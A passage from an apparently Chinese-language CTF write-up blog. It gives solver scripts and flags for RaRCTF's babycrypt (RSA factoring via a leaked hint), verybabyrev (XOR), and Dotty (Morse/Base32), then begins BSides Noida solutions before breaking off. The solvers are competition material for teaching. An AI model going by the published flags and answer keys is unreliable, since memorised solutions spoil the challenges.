        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"error :("</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>低加密指数攻击不行，等wp了。。</p>
<h3 id="babycrypt-200-points"><a href="#babycrypt-200-points" class="headerlink" title="babycrypt (200 points)"></a>babycrypt (200 points)</h3><pre class="line-numbers language-题目描述" data-language="题目描述"><code class="language-题目描述">It&#39;s not a CTF without a baby RSA challenge right?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>加密脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> bytes_to_long

flag <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/challenge/flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">genkey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    e <span class="token operator">=</span> <span class="token number">0x10001</span>
    p<span class="token punctuation">,</span> q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">,</span> getPrime<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> p <span class="token operator">&lt;=</span> q<span class="token punctuation">:</span>
        p<span class="token punctuation">,</span> q <span class="token operator">=</span> q<span class="token punctuation">,</span> p
    n <span class="token operator">=</span> p <span class="token operator">*</span> q
    pubkey <span class="token operator">=</span> <span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    privkey <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">)</span>
    <span class="token keyword">return</span> pubkey<span class="token punctuation">,</span> privkey


<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> pubkey<span class="token punctuation">)</span><span class="token punctuation">:</span>
    e<span class="token punctuation">,</span> n <span class="token operator">=</span> pubkey
    c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    <span class="token keyword">return</span> c


pubkey<span class="token punctuation">,</span> privkey <span class="token operator">=</span> genkey<span class="token punctuation">(</span><span class="token punctuation">)</span>
c <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> pubkey<span class="token punctuation">)</span>

hint <span class="token operator">=</span> pubkey<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token punctuation">(</span>privkey<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'pubkey:'</span><span class="token punctuation">,</span> pubkey<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hint:'</span><span class="token punctuation">,</span> hint<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c:'</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>很简单的一个题目，因为<code>hint = n mod (q - 1)</code>，故<code>hint = p*q mod (q - 1)</code>，而<code>q mod (q - 1) ≡ 1</code>故<code>hint = p mod (q - 1)</code>，而p与q的位数相同，并且hint作为余数也是n位数的一半，故hint一定是<code>p-q+1</code>或者<code>p-2*q+2</code>，只此两种情况，并且第一中的概率远大于第二种，由此获得p、q，解密很简单。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes
<span class="token keyword">import</span> gmpy2


e<span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token number">65537</span><span class="token punctuation">,</span> <span class="token number">6628184042266335731321370671961552635546996386436824057232452529486304765936419737734405610719443213313324209318536703419108150359393106124187802348818781</span>
hint <span class="token operator">=</span> <span class="token number">33727263134500228756141098597564119800249351596771642074985868183142729592181</span>
c <span class="token operator">=</span> <span class="token number">2959835427452504752404208254683893987737026311666739247630497672047540799204271255724695589504155827189632581648446690898470108464270459301317572873769394</span>

<span class="token comment"># 猜测hint = p - (q - 1) 或 hint = p - 2(q - 1)，并且看hint的位数，第一种的可能性较大。</span>
<span class="token comment"># 1。—— hint = p - (q - 1) = p - q + 1</span>
p_q <span class="token operator">=</span> hint <span class="token operator">-</span> <span class="token number">1</span>  <span class="token comment"># p-q</span>
pq <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span>p_q <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> n<span class="token punctuation">)</span>  <span class="token comment"># p+q</span>
p <span class="token operator">=</span> <span class="token punctuation">(</span>pq <span class="token operator">+</span> p_q<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
q <span class="token operator">=</span> n <span class="token operator">//</span> p
<span class="token keyword">assert</span> p <span class="token operator">*</span> q <span class="token operator">==</span> n
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># b'rarctf&#123;g3n3r1c_m4th5_equ4t10n_th1ng_ch4ll3ng3_5a174f54e6&#125;\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h2><h3 id="verybabyrev-100-points"><a href="#verybabyrev-100-points" class="headerlink" title="verybabyrev (100 points)"></a>verybabyrev (100 points)</h3><pre class="line-numbers language-题目描述" data-language="题目描述"><code class="language-题目描述">fun fact: verybabyrev backwards is verybabyrev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>果然只是个简单的逆向。</p>
<p>伪代码如下</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
&#123;
  __int64 s1[12]; &#x2F;&#x2F; [rsp+0h] [rbp-100h] BYREF
  char v4; &#x2F;&#x2F; [rsp+60h] [rbp-A0h]
  char s[140]; &#x2F;&#x2F; [rsp+70h] [rbp-90h] BYREF
  int v6; &#x2F;&#x2F; [rsp+FCh] [rbp-4h]

  setvbuf(stdout, 0LL, 2, 0LL);
  memset(s, 0, 0x80uLL);
  s1[0] &#x3D; 0x45481D1217111313LL;
  s1[1] &#x3D; 0x95F422C260B4145LL;
  s1[2] &#x3D; 0x541B56563D6C5F0BLL;
  s1[3] &#x3D; 0x585C0B3C2945415FLL;
  s1[4] &#x3D; 0x402A6C54095D5F00LL;
  s1[5] &#x3D; 0x4B5F4248276A0606LL;
  s1[6] &#x3D; 0x6C5E5D432C2D4256LL;
  s1[7] &#x3D; 0x6B315E434707412DLL;
  s1[8] &#x3D; 0x5E54491C6E3B0A5ALL;
  s1[9] &#x3D; 0x2828475E05342B1ALL;
  s1[10] &#x3D; 0x60450073B26111FLL;
  s1[11] &#x3D; 0xA774803050B0D04LL;
  v4 &#x3D; 0;
  printf(&quot;Enter your flag: &quot;);
  fgets(s, 128, stdin);
  v6 &#x3D; 0;
  if ( s[0] !&#x3D; &#39;r&#39; )
  &#123;
    puts(&quot;Nope!&quot;);
    exit(0);
  &#125;
  while ( v6 &lt;&#x3D; 126 )
  &#123;
    s[v6] ^&#x3D; s[v6 + 1];
    ++v6;
  &#125;
  if ( !memcmp(s1, s, 0x61uLL) )
  &#123;
    puts(&quot;Correct!&quot;);
    exit(1);
  &#125;
  puts(&quot;Nope!&quot;);
  exit(0);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个又是涉及到大小端排序的，一开始我还没看出来。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

s1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">''</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
s1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0x45481D1217111313'</span>
s1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0x095F422C260B4145'</span>
s1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0x541B56563D6C5F0B'</span>
s1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0x585C0B3C2945415F'</span>
s1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0x402A6C54095D5F00'</span>
s1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0x4B5F4248276A0606'</span>
s1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0x6C5E5D432C2D4256'</span>
s1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0x6B315E434707412D'</span>
s1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0x5E54491C6E3B0A5A'</span>
s1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0x2828475E05342B1A'</span>
s1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token string">'0x060450073B26111F'</span>
s1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token string">'0x0A774803050B0D04'</span>
s <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> s1<span class="token punctuation">:</span>
    s <span class="token operator">+=</span> i<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"长度为: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token comment"># 两个占一个字节，189为奇数，故将a后补0</span>
s <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    tmp1 <span class="token operator">=</span> <span class="token string">'0x'</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span>
    tmp1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>tmp1<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    tmp2 <span class="token operator">=</span> <span class="token string">'0x'</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span>
    tmp2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>tmp2<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp1 <span class="token operator">^</span> tmp2<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> tmp2<span class="token punctuation">)</span>
flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># rarctf&#123;3v3ry_s1ngl3_b4by-r3v_ch4ll3ng3_u535_x0r-f0r_s0m3_r34s0n_4nd_1-d0nt_kn0w_why_dc37158365&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Dotty-150-points"><a href="#Dotty-150-points" class="headerlink" title="Dotty (150 points)"></a>Dotty (150 points)</h3><pre class="line-numbers language-题目描述" data-language="题目描述"><code class="language-题目描述">My new program will keep your secrets safe using military grade encryption!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>极其简单的c#的一个摩斯密码的编码小工具，不过有个check，所对应的值猜测即为flag的值，下面是反编译的程序</p>
<pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">&#x2F;&#x2F; Dotty.Check
internal class Check
&#123;
	public static string check &#x3D; &quot;-|....|.|&#x2F;|..-.|.-..|.-|--.|&#x2F;|..|...|&#x2F;|---|.---|--.-|-..-|.|-.--|...--|..-|--|--..|.....|.--|..|--|.-..|.|.-..|.....|....-|-|.-|.....|-.-|--...|---|.-|--..|-|--.|..---|..---|--...|--.|-...|--..|..-.|-....|-.|.-..|--.-|.--.|.|--...|-|-....|.--.|--..|--...|.-..|.....|-|--.|-.-.|-.|-..|-...|--|--|...--|-..|.-|-.|.-..|.....|&#x2F;|-...|.-|...|.|...--|..---&quot;;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">&#x2F;&#x2F; Dotty.Program
using System;
using System.Collections.Generic;
using System.Linq;
using Dotty;

internal class Program
&#123;
	private static Dictionary&lt;char, string&gt; mapper &#x3D; new Dictionary&lt;char, string&gt;
	&#123;
		&#123;
			&#39; &#39;,
			&quot;&#x2F;&quot;
		&#125;,
		&#123;
			&#39;A&#39;,
			&quot;.-&quot;
		&#125;,
		&#123;
			&#39;B&#39;,
			&quot;-...&quot;
		&#125;,
		&#123;
			&#39;C&#39;,
			&quot;-.-.&quot;
		&#125;,
		&#123;
			&#39;D&#39;,
			&quot;-..&quot;
		&#125;,
		&#123;
			&#39;E&#39;,
			&quot;.&quot;
		&#125;,
		&#123;
			&#39;F&#39;,
			&quot;..-.&quot;
		&#125;,
		&#123;
			&#39;G&#39;,
			&quot;--.&quot;
		&#125;,
		&#123;
			&#39;H&#39;,
			&quot;....&quot;
		&#125;,
		&#123;
			&#39;I&#39;,
			&quot;..&quot;
		&#125;,
		&#123;
			&#39;J&#39;,
			&quot;.---&quot;
		&#125;,
		&#123;
			&#39;K&#39;,
			&quot;-.-&quot;
		&#125;,
		&#123;
			&#39;L&#39;,
			&quot;.-..&quot;
		&#125;,
		&#123;
			&#39;M&#39;,
			&quot;--&quot;
		&#125;,
		&#123;
			&#39;N&#39;,
			&quot;-.&quot;
		&#125;,
		&#123;
			&#39;O&#39;,
			&quot;---&quot;
		&#125;,
		&#123;
			&#39;P&#39;,
			&quot;.--.&quot;
		&#125;,
		&#123;
			&#39;Q&#39;,
			&quot;--.-&quot;
		&#125;,
		&#123;
			&#39;R&#39;,
			&quot;.-.&quot;
		&#125;,
		&#123;
			&#39;S&#39;,
			&quot;...&quot;
		&#125;,
		&#123;
			&#39;T&#39;,
			&quot;-&quot;
		&#125;,
		&#123;
			&#39;U&#39;,
			&quot;..-&quot;
		&#125;,
		&#123;
			&#39;V&#39;,
			&quot;...-&quot;
		&#125;,
		&#123;
			&#39;W&#39;,
			&quot;.--&quot;
		&#125;,
		&#123;
			&#39;X&#39;,
			&quot;-..-&quot;
		&#125;,
		&#123;
			&#39;Y&#39;,
			&quot;-.--&quot;
		&#125;,
		&#123;
			&#39;Z&#39;,
			&quot;--..&quot;
		&#125;,
		&#123;
			&#39;1&#39;,
			&quot;.----&quot;
		&#125;,
		&#123;
			&#39;2&#39;,
			&quot;..---&quot;
		&#125;,
		&#123;
			&#39;3&#39;,
			&quot;...--&quot;
		&#125;,
		&#123;
			&#39;4&#39;,
			&quot;....-&quot;
		&#125;,
		&#123;
			&#39;5&#39;,
			&quot;.....&quot;
		&#125;,
		&#123;
			&#39;6&#39;,
			&quot;-....&quot;
		&#125;,
		&#123;
			&#39;7&#39;,
			&quot;--...&quot;
		&#125;,
		&#123;
			&#39;8&#39;,
			&quot;---..&quot;
		&#125;,
		&#123;
			&#39;9&#39;,
			&quot;----.&quot;
		&#125;,
		&#123;
			&#39;0&#39;,
			&quot;-----&quot;
		&#125;
	&#125;;

	private static string Dotter(string phrase)
	&#123;
		return string.Join(&quot;|&quot;, from char c in phrase
			select mapper[char.ToUpper(c)]);
	&#125;

	private static void Main(string[] args)
	&#123;
		Console.Write(&quot;Please enter your secret to encode: &quot;);
		string phrase &#x3D; Console.ReadLine();
		string text &#x3D; Dotter(phrase);
		if (text &#x3D;&#x3D; Check.check)
		&#123;
			Console.WriteLine(&quot;That&#39;s the right secret!&quot;);
		&#125;
		else
		&#123;
			Console.WriteLine(text);
		&#125;
	&#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>用python解一下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">MorseList <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">".-"</span><span class="token punctuation">:</span> <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token string">"-..."</span><span class="token punctuation">:</span> <span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token string">"-.-."</span><span class="token punctuation">:</span> <span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"-.."</span><span class="token punctuation">:</span> <span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">:</span> <span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token string">"..-."</span><span class="token punctuation">:</span> <span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token string">"--."</span><span class="token punctuation">:</span> <span class="token string">"G"</span><span class="token punctuation">,</span>
    <span class="token string">"...."</span><span class="token punctuation">:</span> <span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">".."</span><span class="token punctuation">:</span> <span class="token string">"I"</span><span class="token punctuation">,</span> <span class="token string">".---"</span><span class="token punctuation">:</span> <span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token string">"-.-"</span><span class="token punctuation">:</span> <span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token string">".-.."</span><span class="token punctuation">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token string">"--"</span><span class="token punctuation">:</span> <span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token string">"-."</span><span class="token punctuation">:</span> <span class="token string">"N"</span><span class="token punctuation">,</span>
    <span class="token string">"---"</span><span class="token punctuation">:</span> <span class="token string">"O"</span><span class="token punctuation">,</span> <span class="token string">".--."</span><span class="token punctuation">:</span> <span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token string">"--.-"</span><span class="token punctuation">:</span> <span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token string">".-."</span><span class="token punctuation">:</span> <span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token string">"..."</span><span class="token punctuation">:</span> <span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">:</span> <span class="token string">"T"</span><span class="token punctuation">,</span>
    <span class="token string">"..-"</span><span class="token punctuation">:</span> <span class="token string">"U"</span><span class="token punctuation">,</span> <span class="token string">"...-"</span><span class="token punctuation">:</span> <span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token string">".--"</span><span class="token punctuation">:</span> <span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token string">"-..-"</span><span class="token punctuation">:</span> <span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"-.--"</span><span class="token punctuation">:</span> <span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token string">"--.."</span><span class="token punctuation">:</span> <span class="token string">"Z"</span><span class="token punctuation">,</span>

    <span class="token string">"-----"</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token string">".----"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"..---"</span><span class="token punctuation">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"...--"</span><span class="token punctuation">:</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"....-"</span><span class="token punctuation">:</span> <span class="token string">"4"</span><span class="token punctuation">,</span>
    <span class="token string">"....."</span><span class="token punctuation">:</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"-...."</span><span class="token punctuation">:</span> <span class="token string">"6"</span><span class="token punctuation">,</span> <span class="token string">"--..."</span><span class="token punctuation">:</span> <span class="token string">"7"</span><span class="token punctuation">,</span> <span class="token string">"---.."</span><span class="token punctuation">:</span> <span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token string">"----."</span><span class="token punctuation">:</span> <span class="token string">"9"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

data <span class="token operator">=</span> <span class="token string">"-|....|.|/|..-.|.-..|.-|--.|/|..|...|/|---|.---|--.-|-..-|.|-.--|...--|..-|--|--..|.....|.--|..|--|.-..|.|.-..|.....|....-|-|.-|.....|-.-|--...|---|.-|--..|-|--.|..---|..---|--...|--.|-...|--..|..-.|-....|-.|.-..|--.-|.--.|.|--...|-|-....|.--.|--..|--...|.-..|.....|-|--.|-.-.|-.|-..|-...|--|--|...--|-..|.-|-.|.-..|.....|/|-...|.-|...|.|...--|..---"</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span>
    <span class="token string">'|'</span><span class="token punctuation">)</span>

flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token operator">!=</span> <span class="token string">'/'</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> MorseList<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># FLAGIS OJQXEY3UMZ5WIMLEL54TA5K7OAZTG227GBZF6NLQPE7T6PZ7L5TGCNDBMM3DANL5 BASE32</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">rarctf&#123;d1d_y0u_p33k_0r_5py????_fa4ac605&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="Very-TriVial-ReVersing"><a href="#Very-TriVial-ReVersing" class="headerlink" title="Very TriVial ReVersing"></a>Very TriVial ReVersing</h3><pre class="line-numbers language-none"><code class="language-none">Hey, at least it&#39;s not Haskell!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">&#96;&#96;&#96;







# BSides Noida CTF 2021

## misc

### **Misc** **&#x2F;** **Welcome**
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Welcome To BSides Noida CTF. Good Luck and Have fun :)<br>Flag : BSNoida{W3lc0me_To_BSidesNoida_CTF}<br><pre class="line-numbers language-none"><code class="language-none">


### **Misc** **&#x2F;** **Psst**

附件下载下来之后发现是一个简单的多级目录，写个脚本遍历一下。这里因为windows路径长度的问题，所以是在linux中写的用的

&#96;&#96;&#96;python
# -*- coding: utf-8 -*-
import os


def solve():
    pha &#x3D; &#39;&#39;
    a &#x3D; 0
    text &#x3D; &#39;&#39;
    print()
    os.chdir(os.getcwd() + &#39;&#x2F;chall&#x2F;Security&#39;)
    while True:
        tmp &#x3D; os.listdir(&#39;.&#x2F;&#39;)
        d &#x3D; &#39;&#39;
        for i in tmp:
            if os.path.isdir(i):
                d &#x3D; i
            if i[:6] &#x3D;&#x3D; &#39;readme&#39;:
                with open(&#39;readme_&#123;0&#125;.txt&#39;.format(a), &#39;r&#39;) as file:
                    text +&#x3D; file.read().replace(&#39;\n&#39;, &#39;&#39;)
                a +&#x3D; 1
        try:
            os.chdir(d)
        except:
            return text
        pha +&#x3D; d + &#39; &#39;
